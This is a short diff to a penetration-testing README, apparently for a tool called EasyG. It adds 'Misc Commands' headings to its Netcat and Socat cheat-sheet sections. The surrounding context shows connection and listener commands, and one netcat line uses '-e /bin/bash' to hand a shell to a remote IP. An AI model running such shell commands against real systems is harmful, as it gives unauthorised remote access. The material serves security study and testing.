@@ -318,6 +318,7 @@ EasyG started out as a script that I use to automate some information gathering 
 
 ### <ins>Netcat</ins>
 
+**Misc Commands**
 ```
 nc -nv 10.11.0.22 110                                                        Connect to a TCP port
 nc -nlvp 4444                                                                Set up a listener
@@ -331,6 +332,7 @@ nc -nv 10.11.0.22 4444 -e /bin/bash                                          Sen
 
 ### <ins>Socat</ins>
 
+**Misc Commands**
 ```
 socat - TCP4:<remote server's ip address>:80                                 Connect to a remote server on port 80
 socat TCP4-LISTEN:443 STDOUT                                                 Create a listener
